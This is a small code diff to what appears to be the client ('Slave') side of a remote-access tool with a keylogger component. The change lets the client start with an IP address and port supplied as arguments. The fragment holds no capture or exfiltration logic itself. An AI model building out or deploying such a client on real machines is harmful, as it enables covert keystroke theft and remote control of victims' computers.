@@ -31,7 +31,16 @@ namespace Slave
             manager.commandsManager.PassKeyloggerManagerInstance(keyLoggerManager);
 
             // Start the processing in a new thread as a task
-            var mainTask = new Task(() => manager.Start());
+            Task mainTask;
+            if (SlaveManager.ip != null && SlaveManager.port != 0)
+            {
+                // Ip and port specified as arguments
+                mainTask = new Task(() => manager.StartWithArguments());
+            }
+            else
+            {
+                mainTask = new Task(() => manager.Start());
+            }
             mainTask.Start();
         }
 
